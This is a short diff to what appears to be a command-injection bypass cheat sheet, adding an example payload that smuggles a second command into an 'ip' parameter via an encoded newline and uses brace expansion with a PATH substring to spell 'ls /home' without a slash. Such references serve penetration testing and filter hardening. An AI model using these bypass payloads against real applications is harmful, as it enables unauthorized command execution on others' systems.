@@ -39,3 +39,14 @@ echo %HOMEPATH:~6,-11%
 ```bash
 $env:HOMEPATH[0]
 ```
+
+# Example
+
+```
+ip=127.0.0.1%0a{ls,${PATH:0:1}home}
+```
+
+```
+ls /home
+```
+
